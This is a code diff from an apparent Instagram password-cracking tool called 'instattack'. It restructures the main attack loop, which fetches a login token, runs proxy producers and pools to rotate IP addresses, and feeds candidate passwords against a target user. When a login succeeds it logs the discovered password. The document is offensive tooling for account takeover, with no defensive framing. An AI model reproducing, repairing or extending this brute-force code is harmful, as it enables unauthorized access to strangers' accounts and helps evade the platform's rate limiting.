@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import sys
 import traceback
 
@@ -11,7 +10,7 @@ from instattack.logger import log_handling
 
 from instattack.users.models import User
 from instattack.proxies import ProxyHandler
-from instattack.handlers import TokenHandler, ResultsHandler, PasswordHandler
+from instattack.instagram import TokenHandler, ResultsHandler, PasswordHandler
 
 from .base import BaseApplication, Instattack, RequestArgs
 from .proxies import ProxyArgs
@@ -76,18 +75,10 @@ class InstattackAttack(BaseApplication, RequestArgs, ProxyArgs):
 
         get_proxy_handler, token_handler = self.get_handlers()
         try:
-            loop.run_until_complete(get_proxy_handler.prepopulate(loop))
-
             task_results = loop.run_until_complete(asyncio.gather(
                 token_handler.consume(loop),
-
-                # I don't think this is working with the broker...
-                # We should test this without prepopulating to see if we
-                # are actually getting proxies coming through...
                 get_proxy_handler.produce(loop),
-
-                # I don't think this is finding proxies, but the above producer
-                # is working because of the prepopulated.
+                get_proxy_handler.pool.consume(loop),
                 get_proxy_handler.broker.find(),
             ))
 
@@ -106,11 +97,17 @@ class InstattackAttack(BaseApplication, RequestArgs, ProxyArgs):
                 raise exceptions.FatalException("Token should not be null.")
             self.log.notice('Received Token', extra={'token': token})
 
-            post_proxy_handler, password_handler = self.post_handlers()
+            post_proxy_handler, password_handler = self.post_handlers(self.user)
+            auth_result_found = asyncio.Event()
+
             try:
-                loop.run_until_complete(asyncio.gather(
-                    password_handler.prepopulate(loop, password_limit=self._pwlimit),
-                    post_proxy_handler.prepopulate(loop)
+                task_results = loop.run_until_complete(asyncio.gather(
+                    results_handler.consume(loop, auth_result_found),
+                    password_handler.consume(loop, auth_result_found, token, results,
+                        password_limit=self._pwlimit),
+                    post_proxy_handler.produce(loop),
+                    post_proxy_handler.pool.consume(loop),
+                    post_proxy_handler.broker.find(),
                 ))
 
             except Exception as e:
@@ -118,49 +115,26 @@ class InstattackAttack(BaseApplication, RequestArgs, ProxyArgs):
                 e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
                 self.log.handle_global_exception(e)
 
+                # Might not have been stopped if we hit an exception, but should
+                # be stopped automatically if the block succeeds.  We will
+                # leave this for now to make sure.
+                self.ensure_servers_shutdown(loop, post_proxy_handler)
+                loop.run_until_complete(results_handler.dump(loop))
+
             else:
-                auth_result_found = asyncio.Event()
+                # Post Proxy Server Stopped Automatically
+                result = task_results[0]
+                if result:
+                    self.log.notice(f'Authenticated User!', extra={
+                        'password': result.context.password
+                    })
 
-                try:
-                    task_results = loop.run_until_complete(asyncio.gather(
-                        results_handler.consume(loop, auth_result_found),
-                        password_handler.consume(loop, auth_result_found, token, results),
-
-                        # I don't think this is working with the broker...
-                        # We should test this without prepopulating to see if we
-                        # are actually getting proxies coming through...
-                        post_proxy_handler.produce(loop),
-
-                        # I don't think this is finding proxies, but the above producer
-                        # is working because of the prepopulated.
-                        post_proxy_handler.broker.find(),
-                    ))
-
-                except Exception as e:
-                    exc_info = sys.exc_info()
-                    e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
-                    self.log.handle_global_exception(e)
-
-                    # Might not have been stopped if we hit an exception, but should
-                    # be stopped automatically if the block succeeds.  We will
-                    # leave this for now to make sure.
-                    self.ensure_servers_shutdown(loop, post_proxy_handler)
-                    loop.run_until_complete(results_handler.dump(loop))
-
-                else:
-                    # Post Proxy Server Stopped Automatically
-                    result = task_results[0]
-                    if result:
-                        self.log.notice(f'Authenticated User!', extra={
-                            'password': result.context.password
-                        })
-
-                finally:
-                    # Might not have been stopped if we hit an exception, but should
-                    # be stopped automatically if the block succeeds.  We will
-                    # leave this for now to make sure.
-                    self.ensure_servers_shutdown(loop, get_proxy_handler, post_proxy_handler)
-                    loop.run_until_complete(results_handler.dump(loop))
+            finally:
+                # Might not have been stopped if we hit an exception, but should
+                # be stopped automatically if the block succeeds.  We will
+                # leave this for now to make sure.
+                self.ensure_servers_shutdown(loop, get_proxy_handler, post_proxy_handler)
+                loop.run_until_complete(results_handler.dump(loop))
 
     def ensure_servers_shutdown(self, loop, *handlers):
         """
@@ -170,9 +144,9 @@ class InstattackAttack(BaseApplication, RequestArgs, ProxyArgs):
         but that is why we cannot restrict to handler._server_running.
         """
         for handler in handlers:
-            # if handler._server_running:
-            self.log.warning(f'{handler.method} Proxy Server Never Stopped.')
-            handler.broker.stop()
+            if not handler._stopped:
+                self.log.warning(f'{handler.method} Proxy Server Never Stopped.')
+                loop.run_until_complete(handler.stop())
 
     async def shutdown(self, loop, signal=None):
 
